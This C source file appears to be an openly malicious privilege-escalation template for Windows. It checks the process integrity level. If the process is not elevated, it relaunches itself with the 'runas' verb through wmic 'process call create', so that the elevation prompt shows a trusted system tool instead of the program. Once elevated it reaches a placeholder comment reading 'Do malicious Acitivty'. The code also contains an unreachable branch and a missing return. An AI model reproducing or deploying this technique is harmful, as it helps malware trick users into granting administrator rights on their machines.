#include <Windows.h>
#include <stdio.h>
#define FILELENGTH 256

int ShowProcessIntegrityLevel()
{
	HANDLE hToken;
	HANDLE hProcess;

	DWORD dwLengthNeeded;
	DWORD dwError = ERROR_SUCCESS;

	PTOKEN_MANDATORY_LABEL pTIL = NULL;
	LPWSTR pStringSid;
	DWORD dwIntegrityLevel;

	hProcess = GetCurrentProcess();
	if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
	{
		// Get the Integrity level.
		if (!GetTokenInformation(hToken, TokenIntegrityLevel,
			NULL, 0, &dwLengthNeeded))
		{
			dwError = GetLastError();
			if (dwError == ERROR_INSUFFICIENT_BUFFER)
			{
				pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,
					dwLengthNeeded);
				if (pTIL != NULL)
				{
					if (GetTokenInformation(hToken, TokenIntegrityLevel,
						pTIL, dwLengthNeeded, &dwLengthNeeded))
					{
						dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
							(DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

						if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
						{
							// Low Integrity
							printf("Low Process\n");
							return SECURITY_MANDATORY_LOW_RID;
						}
						else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
							dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
						{
							// Medium Integrity
							printf("Medium Process\n");
							return SECURITY_MANDATORY_MEDIUM_RID;
						}
						else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
						{
							// High Integrity
							printf("High Integrity Process\n");
							return SECURITY_MANDATORY_HIGH_RID;
						}
						else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
						{
							// System Integrity
							printf("System Integrity Proces\n");
							return SECURITY_MANDATORY_SYSTEM_RID;
						}
					}
					LocalFree(pTIL);
				}
			}
		}
		CloseHandle(hToken);
	}
}

int main(int argc, char** argv)
{
	if (ShowProcessIntegrityLevel() == SECURITY_MANDATORY_HIGH_RID)
	{
		//Do malicious Acitivty
		system("pause");
		return 0;
	}
	else {
		TCHAR filepath[FILELENGTH] = { 0, };
		const char* command = "process call create";
		TCHAR parameter[FILELENGTH] = { 0, };

		GetModuleFileName(NULL, filepath, FILELENGTH);
		wsprintf(parameter, "%s \"%s\"", command, filepath);

		printf("[Info]parameter : %s\n", parameter);

		SHELLEXECUTEINFOA si;
		ZeroMemory(&si, sizeof(SHELLEXECUTEINFO));

		si.cbSize = sizeof(SHELLEXECUTEINFO);
		si.hwnd = NULL;
		si.fMask = SEE_MASK_FLAG_DDEWAIT | SEE_MASK_FLAG_NO_UI;
		si.lpVerb = TEXT("runas");
		si.lpFile = TEXT("wmic");
		si.lpParameters = parameter;
		si.nShow = NULL;
		si.lpDirectory = NULL;
		si.hwnd = GetForegroundWindow();

		ShellExecuteEx(&si);

		WaitForSingleObject(si.hProcess, INFINITE);

		system("pause");
	}

	return 0;
}